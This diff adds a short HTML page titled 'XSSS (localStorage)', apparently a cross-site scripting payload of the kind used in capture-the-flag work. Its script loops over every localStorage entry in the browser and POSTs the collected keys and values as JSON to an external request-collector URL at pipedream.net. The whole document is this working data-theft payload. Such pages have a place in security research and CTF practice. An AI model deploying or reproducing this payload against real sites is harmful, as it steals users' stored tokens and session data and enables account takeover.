@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSSS (localStorage)</title>
+</head>
+<body>
+    <h1>XSSS (localStorage)</h1>
+    <script>
+        let dataToSend = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            dataToSend[key] = localStorage.getItem(key);
+        }
+        fetch("https://enmz6ozs7du1q.x.pipedream.net/?satoki", {
+            method: "POST",
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(dataToSend),
+        })
+    </script>
+</body>
+</html>
